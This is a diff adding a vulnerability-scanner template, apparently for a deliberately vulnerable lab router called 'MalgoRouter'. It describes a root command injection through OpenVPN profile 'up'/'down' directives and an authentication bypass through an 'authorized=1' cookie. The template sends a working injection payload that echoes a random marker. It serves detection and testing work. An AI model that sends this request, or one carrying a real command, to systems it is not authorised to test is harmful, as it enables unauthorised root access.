@@ -1,0 +1,37 @@
+id: malgorouter-openvpn-import-rce
+
+info:
+  name: MalgoRouter openvpn.cgi - Profile Import Command Execution (up/down)
+  author: opencode
+  severity: critical
+  description: |
+    /cgi-bin/openvpn.cgi imports an attacker-supplied "ovpn_config" profile and
+    passes its "up"/"down" directive lines to system() as root. The low tier's
+    reject-list omits "down" and the default/other tier skips filtering entirely.
+    Reachable unauthenticated via the client-controlled "authorized=1" cookie
+    (which also forces the admin role). Command output is returned inline.
+  classification:
+    cwe-id: CWE-78
+  metadata:
+    max-request: 1
+    product: malgorouter
+    vendor: glinet
+  tags: malgorouter,rce,cmdi,cwe-78,openvpn
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/cgi-bin/openvpn.cgi"
+    headers:
+      Cookie: "authorized=1; difficulty=high"
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "action=import&ovpn_config=up%20echo%20{{randstr}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{randstr}}"
+      - type: status
+        status:
+          - 200
